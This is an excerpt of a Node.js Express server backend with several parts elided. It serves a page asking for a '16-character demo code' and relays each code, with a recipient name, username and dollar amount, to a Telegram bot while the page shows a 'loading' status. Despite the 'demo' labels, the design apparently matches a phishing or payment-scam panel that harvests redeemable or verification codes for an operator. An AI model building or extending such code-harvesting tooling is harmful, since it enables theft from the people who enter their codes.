...
const runTelegramBot = !["false", "0", "off"].includes(String(process.env.RUN_TELEGRAM_BOT || "true").trim().toLowerCase());
...
function defaultState() {
  return {
    ...
    currency: "USD",
    avatarUrl: "",
    referralMessage: "Enter the 16-character demo code to continue this preview.",
    reviewStatus: "idle"
  };
}
...
function sanitizePatch(payload = {}) {
  ...
  if (typeof payload.avatarUrl === "string") {
    patch.avatarUrl = payload.avatarUrl.trim().slice(0, 2000000);
  }
...
async function notifyTelegram(text) {
  ...
  if (!response.ok || !payload.ok) {
    throw new Error(payload.description || `Telegram notify failed with ${response.status}.`);
  }
...
app.get("/api/health", (req, res) => {
  ...
  res.json({
    success: true,
    status: "ok",
    telegramBotConfigured: Boolean(telegramBotToken),
    telegramBotEnabled: runTelegramBot
  });
});
...
app.post("/api/submit-code", async (req, res) => {
  disableCache(res);
  const sessionId = normalizeSessionId(req.body && req.body.sessionId);
  const step = String((req.body && req.body.step) || "").trim().toLowerCase();
  ...
  if (!["continue", "done"].includes(step)) {
    return res.status(400).json({ success: false, message: "step must be continue or done." });
  }

  if (!/^[A-Z0-9]{16}$/.test(code)) {
    return res.status(400).json({ success: false, message: "code must be 16 letters or numbers." });
  }

  const session = getSession(sessionId);
  const state = enqueueEvent(sessionId, {
    reviewStatus: step === "continue" ? "loading" : session.state.reviewStatus
  });
  ...
  try {
    await notifyTelegram(
      [
        ...
        `Step: ${step}`,
        `Code: ${code}`,
        `Name: ${state.name || "Demo Recipient"}`,
        `Username: ${state.username || "@demoaccount"}`,
        `Amount: ${(state.amountSign || "$")}${state.amount || "1,000"} ${state.currency || "USD"}`
      ].join("\n")
    );

    return res.json({ success: true, sessionId, step, state });
  } catch (error) {
...
if (telegramBotToken && runTelegramBot) {
